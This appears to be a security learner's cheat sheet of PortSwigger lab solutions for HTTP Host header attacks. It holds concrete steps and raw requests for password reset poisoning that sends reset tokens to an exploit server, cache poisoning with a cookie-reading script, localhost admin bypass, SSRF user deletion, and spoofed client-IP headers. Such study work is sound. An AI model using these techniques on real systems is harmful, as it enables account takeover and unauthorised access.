# HTTP Host header attacks

### Description

The HTTP Host header is a mandatory request header as of HTTP/1.1. It specifies the domain name that the client wants to access. For example, when a user visits https://portswigger.net/web-security, their browser will compose a request containing a Host header as follows:

GET /web-security HTTP/1.1
Host: portswigger.net
In some cases, such as when the request has been forwarded by an intermediary system, the Host value may be altered before it reaches the intended back-end component. We will discuss this scenario in more detail below.

### Basic password reset poisoning (possible administrator || or ordinary user)

```
change the Host header to your exploit server's domain name (your-exploit-server-id.web-security-academy.net) 
Go to your exploit server and open the access log. You will see a request for GET /forgot-password with the temp-forgot-password-token parameter containing a user token
```

### Host header authentication bypass (possible administrator)

```
Browse to /robots.txt and observe that there is an admin panel at /admin.
Try and browse to /admin. You do not have access, but notice the error message, which reveals that the panel can be accessed by local users.
Send the GET /admin request to Burp Repeater.
In Burp Repeater, change the Host header to localhost and send the request. Observe that you have now successfully accessed the admin panel, which provides the option to delete different users.
```
### Web cache poisoning via ambiguous requests (possible caching an admin request || normal user)
```
Crucially, notice that the arbitrary value of your second Host header is reflected in an absolute URL used to import a script from /resources/js/tracking.js.
Remove the second Host header and send the request again using the same cache buster. Notice that you still receive the same cached response containing your injected value.
Go to the exploit server and create a file at /resources/js/tracking.js containing the payload alert(document.cookie). Store the exploit and copy the

Look at the script:
       <script type="text/javascript" src="//0ad1002e04dcae84c0ebe2cb002000b5.web-security-academy.net/resources/js/tracking.js"></script>
       You can poison the path if cache control is available
```

### Routing-based SSRF

```
Unselect Update Host header to match target, find the local url if possible and try to access to admin panel

To find the right IP address iterate it through intruder of burp suite

GET /admin/delete?csrf=ecEdku8m4rPr7xfAJ8szucLDX4F4Uoxb&username=carlos HTTP/1.1
Host: 192.168.0.236
```

### SSRF via flawed request parsing
```
Try:
GET https://0a6e00ea04311359c0bb1e7500f100ea.web-security-academy.net HTTP/1.1
Host: 0a6e00ea04311359c0bb1e7500f100ea.web-security-academy.net
After:
GET https://0a6e00ea04311359c0bb1e7500f100ea.web-security-academy.net HTTP/1.1
Host: burpcollaboratordomain
After:
GET https://0a6e00ea04311359c0bb1e7500f100ea.web-security-academy.net HTTP/1.1
Host: 192.168.0.0/24
```
### SSRF via flawed request parsing
```
GET https://0a6e00ea04311359c0bb1e7500f100ea.web-security-academy.net/admin HTTP/1.1
Host: 192.168.0.198

You need to use the cookie session:
Set-Cookie: session=Azr9oM7CFUVdPJN9peZ2uVKgtK0euOGC; 

Change the method and delete the user
```
### Host validation bypass via connection state attack

```
GET /admin HTTP/1.1
Host: 192.168.0.1

HTTP/1.1 301 Moved Permanently
Location: https://0add00bb04cb37dec044a7b000f400c5.web-security-academy.net/


Change the path back to /.

Change the Host header back to YOUR-LAB-ID.web-security-academy.net.

Using the drop-down menu next to the Send button, change the send mode to Send group in sequence (single connection).

Change the Connection header to keep-alive.

Send the sequence and check the responses. Observe that the second request has successfully accessed the admin panel.

Study the response and observe that the admin panel contains an HTML form for deleting a given user. Make a note of the following details:

The action attribute (/admin/delete)

The name of the input (username)

The csrf token.

And change the method request
```

```

X-Originating-IP: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1

```
